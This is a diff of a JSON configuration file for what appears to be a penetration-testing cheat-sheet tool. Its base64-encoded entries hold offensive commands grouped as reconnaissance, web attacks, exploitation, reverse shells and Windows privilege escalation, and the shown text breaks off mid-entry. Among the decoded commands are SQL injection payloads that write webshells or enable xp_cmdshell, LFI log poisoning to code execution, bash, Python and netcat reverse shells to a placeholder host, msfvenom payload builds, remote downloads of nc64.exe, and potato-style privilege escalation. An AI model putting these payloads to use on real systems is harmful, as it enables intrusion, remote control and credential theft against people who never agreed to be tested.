@@ -1,157 +1,669 @@
 [
   {
-    "button_name": "Info Gathering For All",
-    "note_header": "Information Gathering For All Services",
+    "button_name": "🔍 Reconnaissance",
+    "note_header": "Nmap & Service Enumeration",
     "contents": [
       {
-        "sub_header": "Directory and File Fuzzing with Ffuf",
-        "content": "ZmZ1ZiAtdyAvdXNyL3NoYXJlL3dvcmRsaXN0cy9kaXJiL2NvbW1vbi50eHQgLXUgImh0dHBzOi8vW2lwXS9GVVpaIiAtbWMgMjAw"
+        "sub_header": "Nmap Quick Scan",
+        "content": "c3VkbyBubWFwIC1zUyAtc1YgLXNDIC1UNCAtUG4gPElQPiAtb0EgcXVpY2s="
       },
       {
-        "sub_header": "WordPress XML-RPC Password Bruteforce",
-        "content": "Y3VybCAtWCBQT1NUIC1kICc8bWV0aG9kQ2FsbD48bWV0aG9kTmFtZT53cC5nZXRVc2VycyBCbG9nczwvbWV0aG9kTmFtZT48cGFyYW1zPjxwYXJhbT48dmFsdWU+YWRtaW48L3ZhbHVlPjwvcGFyYW0+PHBhcmFtPjx2YWx1ZT5QQVNTX0hFUkU8L3ZhbHVlPjwvcGFyYW0+PC9wYXJhbXM+PC9tZXRob2RDYWxsPicgaHR0cHM6Ly9baXBdL3htbHJwYy5waHA="
+        "sub_header": "Nmap Full Port Scan",
+        "content": "c3VkbyBubWFwIC1zUyAtcC0gLVQ0IC1QbiA8SVA+IC1vQSBmdWxs"
       },
       {
-        "sub_header": "Subdomain Brute-forcing with Gobuster",
-        "content": "Z29idXN0ZXIgZG5zIC1kIGV4YW1wbGUuY29tIC13IC91c3Ivc2hhcmUvd29yZGxpc3RzL2Rpc2NvdmVyeS9kbnMvbmFtZWxpc3QudHh0"
+        "sub_header": "Nmap UDP Scan",
+        "content": "c3VkbyBubWFwIC1zVSAtLXRvcC1wb3J0cyAxMDAgPElQPg=="
       },
       {
-        "sub_header": "Jenkins Dashboard Bruteforce using Hydra",
-        "content": "aHlkcmEgLWwgYWRtaW4gLVAgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQgW2lwXSBodHRwLXBvc3QtZm9ybSAiL2xvZ2luOkpfVVNFUk5BTUU9XlVTRVImSl9QQVNTV09SRD1eUEFTU14mZnJvbT0lMkY6SW52YWxpZCB1c2VybmFtZSBvciBwYXNzd29yZCI="
+        "sub_header": "Nmap AD Ports",
+        "content": "c3VkbyBubWFwIC1wIDg4LDEzNSwxMzksMzg5LDQ0NSw2MzYsMzI2OCAtc0NWIDxJUD4="
       },
       {
-        "sub_header": "JSON Web Token (JWT) Secret Cracking",
-        "content": "aGFzaGNhdCAtbSAxNjUwMCBqd3RfdG9rZW4udHh0IC91c3Ivc2hhcmUvd29yZGxpc3RzL3JvY2t5b3UudHh0"
+        "sub_header": "Nmap SMB Vuln Scripts",
+        "content": "c3VkbyBubWFwIC1wIDEzOSw0NDUgLS1zY3JpcHQgc21iLXZ1bG4tKiA8SVA+"
+      },
+      {
+        "sub_header": "Nmap SNMP",
+        "content": "c3VkbyBubWFwIC1zVSAtcCAxNjEgLS1zY3JpcHQgc25tcC1icnV0ZSxzbm1wLWluZm8sc25tcC13aW4zMi11c2VycyA8SVA+"
+      },
+      {
+        "sub_header": "Nmap Through Pivot",
+        "content": "bm1hcCAtcC0gLS1taW4tcmF0ZSAxMDAwMCAtc1MgLXNDViAtQSA8SVA+IC1Qbg=="
+      },
+      {
+        "sub_header": "Directory Busting - Feroxbuster",
+        "content": "ZmVyb3hidXN0ZXIgLXUgaHR0cDovLzxJUD4gLXcgL3Vzci9zaGFyZS9zZWNsaXN0cy9EaXNjb3ZlcnkvV2ViLUNvbnRlbnQvcmFmdC1tZWRpdW0tZGlyZWN0b3JpZXMudHh0IC14IHBocCxodG1sLHR4dCx6aXA="
+      },
+      {
+        "sub_header": "Directory Busting - Gobuster",
+        "content": "Z29idXN0ZXIgZGlyIC11IGh0dHA6Ly88SVA+IC13IC91c3Ivc2hhcmUvd29yZGxpc3RzL2RpcmIvY29tbW9uLnR4dCAteCBwaHAsaHRtbCx0eHQ="
+      },
+      {
+        "sub_header": "Directory Busting - Ffuf",
+        "content": "ZmZ1ZiAtdSBodHRwOi8vPElQPi9GVVpaIC13IC91c3Ivc2hhcmUvc2VjbGlzdHMvRGlzY292ZXJ5L1dlYi1Db250ZW50L2NvbW1vbi50eHQgLW1jIDIwMCwzMDEsMzAy"
+      },
+      {
+        "sub_header": "Vhost/Subdomain - Gobuster",
+        "content": "Z29idXN0ZXIgdmhvc3QgLXUgaHR0cDovLzxJUD4gLXcgL3Vzci9zaGFyZS9zZWNsaXN0cy9EaXNjb3ZlcnkvRE5TL3N1YmRvbWFpbnMtdG9wMW1pbGxpb24tMTEwMDAwLnR4dCAtLWFwcGVuZC1kb21haW4="
+      },
+      {
+        "sub_header": "Vhost/Subdomain - Ffuf",
+        "content": "ZmZ1ZiAtdSBodHRwOi8vPElQPiAtSCAnSG9zdDogRlVaWi50YXJnZXQuaHRiJyAtdyBzdWJkb21haW5zLnR4dCAtZnMgPHNpemU+"
+      },
+      {
+        "sub_header": "Manual Web Checks",
+        "content": "Y3VybCAtcyBodHRwOi8vPElQPi9yb2JvdHMudHh0CmN1cmwgLUkgaHR0cDovLzxJUD4vLmdpdC9jb25maWcKd2hhdHdlYiBodHRwOi8vPElQPgpuaWt0byAtaCBodHRwOi8vPElQPg=="
+      },
+      {
+        "sub_header": "SMB - List Shares",
+        "content": "c21iY2xpZW50IC1MIC8vPElQPiAtTg=="
+      },
+      {
+        "sub_header": "SMB - smbmap",
+        "content": "c21ibWFwIC1IIDxJUD4gLXUgZ3Vlc3QgLXAgJyc="
+      },
+      {
+        "sub_header": "SMB - enum4linux",
+        "content": "ZW51bTRsaW51eCAtYSA8SVA+"
+      },
+      {
+        "sub_header": "SMB - nxc Enum",
+        "content": "bnhjIHNtYiA8SVA+IC0tc2hhcmVzIC0tcmlkLWJydXRl"
+      },
+      {
+        "sub_header": "SMB - Download All",
+        "content": "c21iY2xpZW50IC8vPElQPi9TaGFyZSAtVSB1c2VyJXBhc3MgLWMgJ3Byb21wdCBPRkY7IHJlY3Vyc2UgT047IG1nZXQgKic="
+      },
+      {
+        "sub_header": "SMB - Mount Share",
+        "content": "c3VkbyBtb3VudCAtdCBjaWZzIC8vPElQPi9TaGFyZSAvbW50IC1vIHVzZXJuYW1lPXVzZXIscGFzc3dvcmQ9cGFzcw=="
+      },
+      {
+        "sub_header": "LDAP - Base Query",
+        "content": "bGRhcHNlYXJjaCAteCAtSCBsZGFwOi8vPElQPiAtYiAnZGM9ZG9tYWluLGRjPWxvY2FsJw=="
+      },
+      {
+        "sub_header": "LDAP - List Users",
+        "content": "bGRhcHNlYXJjaCAteCAtSCBsZGFwOi8vPElQPiAtYiAnZGM9ZG9tYWluLGRjPWxvY2FsJyAnKG9iamVjdENsYXNzPXVzZXIpJyBzQU1BY2NvdW50TmFtZQ=="
+      },
+      {
+        "sub_header": "LDAP - Kerberoastable Users",
+        "content": "bGRhcHNlYXJjaCAteCAtSCBsZGFwOi8vPElQPiAtYiAnZGM9ZG9tYWluLGRjPWxvY2FsJyAnKCYob2JqZWN0Q2xhc3M9dXNlcikoc2VydmljZVByaW5jaXBhbE5hbWU9KikpJyBzQU1BY2NvdW50TmFtZQ=="
+      },
+      {
+        "sub_header": "LDAP - ASREProastable Users",
+        "content": "bGRhcHNlYXJjaCAteCAtSCBsZGFwOi8vPElQPiAtYiAnZGM9ZG9tYWluLGRjPWxvY2FsJyAnKCYob2JqZWN0Q2xhc3M9dXNlcikodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTQxOTQzMDQpKScgc0FNQWNjb3VudE5hbWU="
+      },
+      {
+        "sub_header": "LDAP - Descriptions with Passwords",
+        "content": "bGRhcHNlYXJjaCAteCAtSCBsZGFwOi8vPElQPiAtYiAnZGM9ZG9tYWluLGRjPWxvY2FsJyAnKGRlc2NyaXB0aW9uPSopJyBzQU1BY2NvdW50TmFtZSBkZXNjcmlwdGlvbg=="
+      },
+      {
+        "sub_header": "SNMP - onesixtyone",
+        "content": "b25lc2l4dHlvbmUgLWMgL3Vzci9zaGFyZS9zZWNsaXN0cy9EaXNjb3ZlcnkvU05NUC9zbm1wLW9uZXNpeHR5b25lLnR4dCA8SVA+"
+      },
+      {
+        "sub_header": "SNMP - snmpwalk",
+        "content": "c25tcHdhbGsgLXYyYyAtYyBwdWJsaWMgPElQPg=="
+      },
+      {
+        "sub_header": "SNMP - Extended Objects",
+        "content": "c25tcHdhbGsgLWMgcHVibGljIC12MSA8SVA+IE5FVC1TTk1QLUVYVEVORC1NSUI6Om5zRXh0ZW5kT2JqZWN0cw=="
+      },
+      {
+        "sub_header": "FTP - Anonymous",
+        "content": "ZnRwIDxJUD4gICMgdXNlcjogYW5vbnltb3VzLCBwYXNzOiBibGFuaw=="
+      },
+      {
+        "sub_header": "FTP - Nmap Scripts",
+        "content": "bm1hcCAtcCAyMSAtLXNjcmlwdCBmdHAtYW5vbixmdHAtYm91bmNlIDxJUD4="
+      },
+      {
+        "sub_header": "SMTP - User Enumeration",
+        "content": "c210cC11c2VyLWVudW0gLU0gVlJGWSAtVSB1c2VybmFtZXMudHh0IC10IDxJUD4="
+      },
+      {
+        "sub_header": "NFS - Show Mounts",
+        "content": "c2hvd21vdW50IC1lIDxJUD4="
+      },
+      {
+        "sub_header": "NFS - Mount",
+        "content": "c3VkbyBtb3VudCAtdCBuZnMgPElQPjovZXhwb3J0IC9tbnQvbmZz"
+      },
+      {
+        "sub_header": "MySQL - Connect",
+        "content": "bXlzcWwgLWggPElQPiAtdSByb290IC1w"
+      },
+      {
+        "sub_header": "MSSQL - nxc",
+        "content": "bnhjIG1zc3FsIDxJUD4gLXUgc2EgLXAgJycgLS1sb2NhbC1hdXRo"
+      },
+      {
+        "sub_header": "MSSQL - impacket",
+        "content": "aW1wYWNrZXQtbXNzcWxjbGllbnQgZG9tYWluL3VzZXI6cGFzc0A8SVA+IC13aW5kb3dzLWF1dGg="
+      },
+      {
+        "sub_header": "Redis - Connect",
+        "content": "cmVkaXMtY2xpIC1oIDxJUD4gaW5mbwpyZWRpcy1jbGkgLWggPElQPiBrZXlzICcq"
+      },
+      {
+        "sub_header": "DNS - Zone Transfer",
+        "content": "ZGlnIGF4ZnIgQDxETlNfSVA+IGRvbWFpbi5odGIKZG5zcmVjb24gLWQgZG9tYWluLmh0YiAtdCBheGZy"
+      },
+      {
+        "sub_header": "RPC - Null Session",
+        "content": "cnBjY2xpZW50IC1VICcnIC1OIDxJUD4KIyBJbnNpZGU6IGVudW1kb211c2VycywgZW51bWRvbWdyb3VwcywgcXVlcnlkb21pbmZvLCBuZXRzaGFyZWVudW1hbGw="
       }
     ]
   },
   {
-    "button_name": "Info Gathering For Web",
-    "note_header": "Information Gathering For Web",
+    "button_name": "🌐 Web Attacks",
+    "note_header": "LFI, SQLi, Command Injection & More",
     "contents": [
       {
-        "sub_header": "Identifying Hidden Admin Panels with Ffuf",
-        "content": "ZmZ1ZiAtdyAvdXNyL3NoYXJlL3dvcmRsaXN0cy9zZWNsaXN0cy9EaXNjb3ZlcnkvV2ViLUNvbnRlbnQvY29tbW9uLnR4dCAtdSAgaHR0cHM6Ly88dGFyZ2V0LWRvbWFpbj4vRlVaWiAtbWMgMjAwLDMwMQ=="
+        "sub_header": "LFI - Basic",
+        "content": "Y3VybCAnaHR0cDovLzxJUD4vcGFnZS5waHA/ZmlsZT0uLi8uLi8uLi8uLi9ldGMvcGFzc3dkJw=="
       },
       {
-        "sub_header": "Checking for Exposed Git Repositories",
-        "content": "Y3VybCAtcyAtZiAiaHR0cHM6Ly88dGFyZ2V0LWRvbWFpbj4vLmdpdC9jb25maWci"
+        "sub_header": "LFI - PHP Filter Read",
+        "content": "Y3VybCAnaHR0cDovLzxJUD4vcGFnZS5waHA/ZmlsZT1waHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWluZGV4LnBocCcgfCBiYXNlNjQgLWQ="
       },
       {
-        "sub_header": "Automated Virtual Host Discovery",
-        "content": "Z29idXN0ZXIgdmhvc3QgLXUgIGh0dHBzOi8vPHRhcmdldC1kb21haW4+IC13IC91c3Ivc2hhcmUvd29yZGxpc3RzL3NlY2xpc3RzL0Rpc2NvdmVyeS9ETlMvbmFtZWxpc3QudHh0"
+        "sub_header": "LFI - Log Poisoning to RCE",
+        "content": "Y3VybCAtQSAnPD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+JyBodHRwOi8vPElQPi8KY3VybCAnaHR0cDovLzxJUD4vcGFnZS5waHA/ZmlsZT0uLi8uLi8uLi8uLi92YXIvbG9nL2FwYWNoZTIvYWNjZXNzLmxvZyZjbWQ9aWQn"
+      },
+      {
+        "sub_header": "SQLi - Auth Bypass",
+        "content": "JyBPUiAxPTEtLSAtCicgT1IgJzEnPScx"
+      },
+      {
+        "sub_header": "SQLi - Find Column Count",
+        "content": "JyBPUkRFUiBCWSAxLS0gLSAgKGluY3JlbWVudCB1bnRpbCBlcnJvcik="
+      },
+      {
+        "sub_header": "SQLi - UNION Enum (MySQL)",
+        "content": "JyBVTklPTiBTRUxFQ1QgMSwyLDMtLSAtCicgVU5JT04gU0VMRUNUIEBAdmVyc2lvbix1c2VyKCksZGF0YWJhc2UoKS0tIC0KJyBVTklPTiBTRUxFQ1QgMSxncm91cF9jb25jYXQodGFibGVfbmFtZSksMyBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgV0hFUkUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCktLSAtCicgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lLDB4M2EscGFzc3dvcmQpLDMgRlJPTSB1c2Vycy0tIC0="
+      },
+      {
+        "sub_header": "SQLi - Write Webshell (MySQL)",
+        "content": "JyBVTklPTiBTRUxFQ1QgJzw/cGhwIHN5c3RlbSgkX0dFVFsnY21kJ10pOyA/PicgSU5UTyBPVVRGSUxFICcvdmFyL3d3dy9odG1sL3NoZWxsLnBocCctLSAt"
+      },
+      {
+        "sub_header": "SQLi - MSSQL Enable xp_cmdshell",
+        "content": "JzsgRVhFQyBzcF9jb25maWd1cmUgJ3Nob3cgYWR2YW5jZWQgb3B0aW9ucycsMTsgUkVDT05GSUdVUkU7LS0KJzsgRVhFQyBzcF9jb25maWd1cmUgJ3hwX2NtZHNoZWxsJywxOyBSRUNPTkZJR1VSRTstLQonOyBFWEVDIHhwX2NtZHNoZWxsICd3aG9hbWknOy0t"
+      },
+      {
+        "sub_header": "SQLi - Time-Based Blind (MySQL)",
+        "content": "JyBBTkQgSUYoMT0xLFNMRUVQKDUpLDApLS0gLQ=="
+      },
+      {
+        "sub_header": "SQLi - Time-Based Blind (MSSQL)",
+        "content": "JzsgSUYgKDE9MSkgV0FJVEZPUiBERUxBWSAnMDA6MDA6MDUnLS0gLQ=="
+      },
+      {
+        "sub_header": "File Upload - Double Extensions",
+        "content": "c2hlbGwucGhwLmpwZwpzaGVsbC5waHAlMDAuanBnCnNoZWxsLnBocDU="
+      },
+      {
+        "sub_header": "File Upload - Magic Bytes",
+        "content": "cHJpbnRmICdceDg5UE5HXHJcblx4MWFcbjw/cGhwIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/PicgPiBzaGVsbC5wbmcucGhw"
+      },
+      {
+        "sub_header": "Command Injection",
+        "content": "MTI3LjAuMC4xOyB3aG9hbWkKMTI3LjAuMC4xIHwgd2hvYW1pCjEyNy4wLjAuMSB8fCB3aG9hbWkKMTI3LjAuMC4xICYmIHdob2FtaQoxMjcuMC4wLjFgd2hvYW1pYAoxMjcuMC4wLjEkKHdob2FtaSk="
+      },
+      {
+        "sub_header": "SSTI - Test (Jinja2/Twig)",
+        "content": "e3s3Kjd9fQ=="
+      },
+      {
+        "sub_header": "SSTI - Jinja2 RCE",
+        "content": "e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdpZCcpLnJlYWQoKX19"
+      },
+      {
+        "sub_header": "XXE - Read File",
+        "content": "PD94bWwgdmVyc2lvbj0nMS4wJz8+CjwhRE9DVFlQRSBmb28gWzwhRU5USVRZIHh4ZSBTWVNURU0gJ2ZpbGU6Ly8vZXRjL3Bhc3N3ZCc+XT4KPGRhdGE+Jnh4ZTs8L2RhdGE+"
       }
     ]
   },
   {
-    "button_name": "Bypassing For Web",
-    "note_header": "Random Bypassing Techniques For Web",
+    "button_name": "💥 Exploitation",
+    "note_header": "Public Exploits & Initial Access",
     "contents": [
       {
-        "sub_header": "Bypassing 403 Forbidden with X-Forwarded-For",
-        "content": "Y3VybCAtcyAtaCAiWC1Gb3J3YXJkZWQtRm9yOiAxMjcuMC4wLjEiIGh0dHBzOi8vPHRhcmdldC1kb21haW4+L2FkbWlu"
+        "sub_header": "Searchsploit",
+        "content": "c2VhcmNoc3Bsb2l0ICdBcGFjaGUgMi40JwpzZWFyY2hzcGxvaXQgLW0gNDIwMzEKcHl0aG9uMiBleHBsb2l0LnB5"
       },
       {
-        "sub_header": "Path Normalization Bypass via Dot Segments",
-        "content": "Y3VybCAtcyAiaHR0cHM6Ly88dGFyZ2V0LWRvbWFpbj4vYWRtaW4vLi4vLi8i"
-      },
-      {
-        "sub_header": "WAF Bypass via Double URL Encoding",
-        "content": "Y3VybCAtcyAiaHR0cHM6Ly88dGFyZ2V0LWRvbWFpbj4vc2VhcmNoP3E9JTI1M2Mtc2NyaXB0JTI1M2Ui"
+        "sub_header": "MSSQL xp_cmdshell Access",
+        "content": "aW1wYWNrZXQtbXNzcWxjbGllbnQgZG9tYWluL3VzZXI6cGFzc0A8SVA+IC13aW5kb3dzLWF1dGgKRVhFQyBzcF9jb25maWd1cmUgJ3Nob3cgYWR2YW5jZWQgb3B0aW9ucycsIDE7IFJFQ09ORklHVVJFOwpFWEVDIHNwX2NvbmZpZ3VyZSAneHBfY21kc2hlbGwnLCAxOyBSRUNPTkZJR1VSRTsKRVhFQyB4cF9jbWRzaGVsbCAnd2hvYW1pJzsKRVhFQyB4cF9jbWRzaGVsbCAncG93ZXJzaGVsbCAtYyAiY3VybC5leGUgaHR0cDovLzxJUD4vbmM2NC5leGUgLW8gQzpcVXNlcnNcUHVibGljXG5jNjQuZXhlIic7"
       }
     ]
   },
   {
-    "button_name": "Reverse Shell",
-    "note_header": "Payloads For Reverse Shell (RevShell)",
+    "button_name": "🐚 Reverse Shells",
+    "note_header": "One-Liners & Payload Generation",
     "contents": [
       {
-        "sub_header": "Python: Basic Reverse Shell",
-        "content": "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiSFlQRVJfSVAiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJw=="
+        "sub_header": "Listener - rlwrap",
+        "content": "cmx3cmFwIG5jIC1sdm5wIDQ0NDQ="
       },
       {
-        "sub_header": "Bash: TCP Reverse Shell",
-        "content": "YmFzaCAtaSA+JiAvZGV2L3RjcC9IWVBFUl9JUC80NDQ0IDA+JjEK"
+        "sub_header": "Listener - Basic",
+        "content": "bmMgLWx2bnAgNDQ0NA=="
       },
       {
-        "sub_header": "PHP: Exec Reverse Shell",
-        "content": "cGhwIC1yICckc29jaz1mcz9ja29wZW4oIkhZUEVSX0lQIiw0NDQ0KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc="
+        "sub_header": "Listener - Socat Full TTY",
+        "content": "c29jYXQgZmlsZTpgdHR5YCxyYXcsZWNobz0wIFRDUC1MSVNURU46NDQ0NA=="
       },
       {
-        "sub_header": "Netcat: Traditional Shell (-e)",
-        "content": "bmMgSFlQRVJfSVAgNDQ0NCAtZSAvYmluL2Jhc2g="
+        "sub_header": "Bash Reverse Shell",
+        "content": "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC88SVA+LzQ0NDQgMD4mMSc="
+      },
+      {
+        "sub_header": "Python3 Reverse Shell",
+        "content": "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoIjxJUD4iLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkn"
+      },
+      {
+        "sub_header": "Netcat Reverse Shell (no -e)",
+        "content": "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgPElQPiA0NDQ0ID4vdG1wL2Y="
+      },
+      {
+        "sub_header": "PHP Reverse Shell",
+        "content": "PD9waHAgc3lzdGVtKCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzxJUD4vNDQ0NCAwPiYxJyIpOyA/Pg=="
+      },
+      {
+        "sub_header": "msfvenom - Linux ELF",
+        "content": "bXNmdmVub20gLXAgbGludXgveDY0L3NoZWxsX3JldmVyc2VfdGNwIExIT1NUPTxJUD4gTFBPUlQ9NDQ0NCAtZiBlbGYgLW8gc2hlbGwuZWxm"
+      },
+      {
+        "sub_header": "msfvenom - Windows EXE",
+        "content": "bXNmdmVub20gLXAgd2luZG93cy94NjQvc2hlbGxfcmV2ZXJzZV90Y3AgTEhPU1Q9PElQPiBMUE9SVD00NDQ0IC1mIGV4ZSAtbyBzaGVsbC5leGU="
+      },
+      {
+        "sub_header": "msfvenom - PHP",
+        "content": "bXNmdmVub20gLXAgcGhwL3JldmVyc2VfcGhwIExIT1NUPTxJUD4gTFBPUlQ9NDQ0NCAtZiByYXcgPiBzaGVsbC5waHA="
+      },
+      {
+        "sub_header": "msfvenom - WAR",
+        "content": "bXNmdmVub20gLXAgamF2YS9qc3Bfc2hlbGxfcmV2ZXJzZV90Y3AgTEhPU1Q9PElQPiBMUE9SVD00NDQ0IC1mIHdhciAtbyBzaGVsbC53YXI="
+      },
+      {
+        "sub_header": "msfvenom - DLL",
+        "content": "bXNmdmVub20gLXAgd2luZG93cy94NjQvc2hlbGxfcmV2ZXJzZV90Y3AgTEhPU1Q9PElQPiBMUE9SVD00NDQ0IC1mIGRsbCAtbyBzaGVsbC5kbGw="
+      },
+      {
+        "sub_header": "msfvenom - MSI",
+        "content": "bXNmdmVub20gLXAgd2luZG93cy94NjQvc2hlbGxfcmV2ZXJzZV90Y3AgTEhPU1Q9PElQPiBMUE9SVD00NDQ0IC1mIG1zaSAtbyBzaGVsbC5tc2k="
+      },
+      {
+        "sub_header": "Stabilize Shell (Linux)",
+        "content": "cHl0aG9uMyAtYyAnaW1wb3J0IHB0eTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJwojIFByZXNzIEN0cmwrWgpzdHR5IHJhdyAtZWNobzsgZmcKZXhwb3J0IFRFUk09eHRlcm0KZXhwb3J0IFNIRUxMPWJhc2g="
+      },
+      {
+        "sub_header": "File Transfer - HTTP Server",
+        "content": "cHl0aG9uMyAtbSBodHRwLnNlcnZlciA4MA=="
+      },
+      {
+        "sub_header": "File Transfer - SMB Server",
+        "content": "aW1wYWNrZXQtc21ic2VydmVyIHNoYXJlIC4gLXNtYjJzdXBwb3J0IC11c2VybmFtZSB1c2VyIC1wYXNzd29yZCBwYXNz"
+      },
+      {
+        "sub_header": "File Transfer - Linux Download",
+        "content": "d2dldCBodHRwOi8vPElQPi9maWxlCmN1cmwgLU8gaHR0cDovLzxJUD4vZmlsZQ=="
+      },
+      {
+        "sub_header": "File Transfer - Windows certutil",
+        "content": "Y2VydHV0aWwgLXVybGNhY2hlIC1mIGh0dHA6Ly88SVA+L2ZpbGUuZXhlIGZpbGUuZXhl"
+      },
+      {
+        "sub_header": "File Transfer - PowerShell",
+        "content": "cG93ZXJzaGVsbCAtYyAnSW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vPElQPi9maWxlIC1PdXRGaWxlIGZpbGUn"
+      },
+      {
+        "sub_header": "File Transfer - Windows SMB",
+        "content": "bmV0IHVzZSBaOiBcXDxJUD5cc2hhcmUgL3VzZXI6dXNlciBwYXNzICYmIGNvcHkgWjpcZmlsZSAu"
       }
     ]
   },
   {
-    "button_name": "SQLi (MySQL)",
-    "note_header": "SQL Injection Payloads And Tips For MYSQL (SQLi)",
+    "button_name": "🪟 Windows PrivEsc",
+    "note_header": "Windows Privilege Escalation Techniques",
     "contents": [
       {
-        "sub_header": "Classic Authentication Bypass with Tautology",
-        "content": "J3VuaW9uIHNlbGVjdCAxLCdhZG1pbicsJzgxZGNkYmFmYmJlYWQxMDViYmRlNzRiMWQ2ODdhYmVmJyMj"
+        "sub_header": "Initial Enumeration",
+        "content": "d2hvYW1pIC9hbGwKd2hvYW1pIC9wcml2CnN5c3RlbWluZm8Kd21pYyBxZmUgZ2V0IENhcHRpb24sSG90Rml4SUQKbmV0IHVzZXI7IG5ldCBsb2NhbGdyb3VwIGFkbWluaXN0cmF0b3Jz"
       },
       {
-        "sub_header": "Extracting MySQL Version via Error (UpdateXML)",
-        "content": "JyBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDAsdmVyc2lvbigpKSwxKSM="
+        "sub_header": "PowerShell History",
+        "content": "dHlwZSAkZW52OkFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcUG93ZXJTaGVsbFxQU1JlYWRMaW5lXENvbnNvbGVIb3N0X2hpc3RvcnkudHh0"
       },
       {
-        "sub_header": "Bypassing Quotes with Hex Encoding",
-        "content": "J3VuaW9uIHNlbGVjdCAweDYxNjQ2ZDY5NmU="
+        "sub_header": "Credential Files",
+        "content": "Y21ka2V5IC9saXN0CmZpbmRzdHIgL3NpIHBhc3N3b3JkICoudHh0ICoueG1sICouY29uZmlnICouaW5pCnJlZyBxdWVyeSBIS0xNIC9mIHBhc3N3b3JkIC90IFJFR19TWiAvcwpyZWcgcXVlcnkgJ0hLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudHZlcnNpb25cV2lubG9nb24n"
       },
       {
-        "sub_header": "Finding Column Count via Order By",
-        "content": "JyBvcmRlciBieSAxMCNo"
+        "sub_header": "Automated - winPEAS",
+        "content": "Y2VydHV0aWwgLXVybGNhY2hlIC1mIGh0dHA6Ly88SVA+L3dpblBFQVN4NjQuZXhlIHdpblBFQVMuZXhlICYmIC5cd2luUEVBUy5leGU="
+      },
+      {
+        "sub_header": "Automated - PowerUp",
+        "content": "cG93ZXJzaGVsbCAtZXAgYnlwYXNzCkltcG9ydC1Nb2R1bGUgLlxQb3dlclVwLnBzMQpJbnZva2UtQWxsQ2hlY2tz"
+      },
+      {
+        "sub_header": "SeImpersonate - PrintSpoofer",
+        "content": "LlxQcmludFNwb29mZXI2NC5leGUgLWkgLWMgY21kCi5cUHJpbnRTcG9vZmVyNjQuZXhlIC1jICduYzY0LmV4ZSA8SVA+IDQ0NDQgLWUgcG93ZXJzaGVsbCc="
+      },
+      {
+        "sub_header": "SeImpersonate - GodPotato",
+        "content": "LlxHb2RQb3RhdG8uZXhlIC1jbWQgJ2NtZCAvYyB3aG9hbWkn"
+      },
+      {
+        "sub_header": "SeImpersonate - SigmaPotato",
+        "content": "LlxTaWdtYVBvdGF0by5leGUgLS1yZXZzaGVsbCA8SVA+IDQ0NDQ="
+      },
+      {
+        "sub_header": "AlwaysInstallElevated",
+        "content": "cmVnIHF1ZXJ5IEhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIC92IEFsd2F5c0luc3RhbGxFbGV2YXRlZApyZWcgcXVlcnkgSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIgL3YgQWx3YXlzSW5zdGFsbEVsZXZhdGVkCm1zZnZlbm9tIC1wIHdpbmRvd3MveDY0L3NoZWxsX3JldmVyc2VfdGNwIExIT1NUPTxJUD4gTFBPUlQ9NDQ0NCAtZiBtc2kgLW8gc2hlbGwubXNpCm1zaWV4ZWMgL3F1aWV0IC9xbiAvaSBzaGVsbC5tc2k="
+      },
+      {
+        "sub_header": "Unquoted Service Path",
+        "content": "d21pYyBzZXJ2aWNlIGdldCBuYW1lLHBhdGhuYW1lIHwgZmluZHN0ciAvaSAvdiAnQzpcV2luZG93c1wnIHwgZmluZHN0ciAvaSAvdiAnIicKc2Mgc3RvcCA8c2VydmljZT4gJiYgc2Mgc3RhcnQgPHNlcnZpY2U+"
+      },
+      {
+        "sub_header": "Service Binary Hijacking",
+        "content": "R2V0LUNpbUluc3RhbmNlIC1DbGFzc05hbWUgd2luMzJfc2VydmljZSB8IFNlbGVjdCBOYW1lLFN0YXRlLFBhdGhOYW1lIHwgV2hlcmUtT2JqZWN0IHskXy5TdGF0ZSAtbGlrZSAnUnVubmluZyd9CmljYWNscyAnQzpceGFtcHBcYXBhY2hlXGJpblxodHRwZC5leGUn"
+      },
+      {
+        "sub_header": "Dump SAM Hashes",
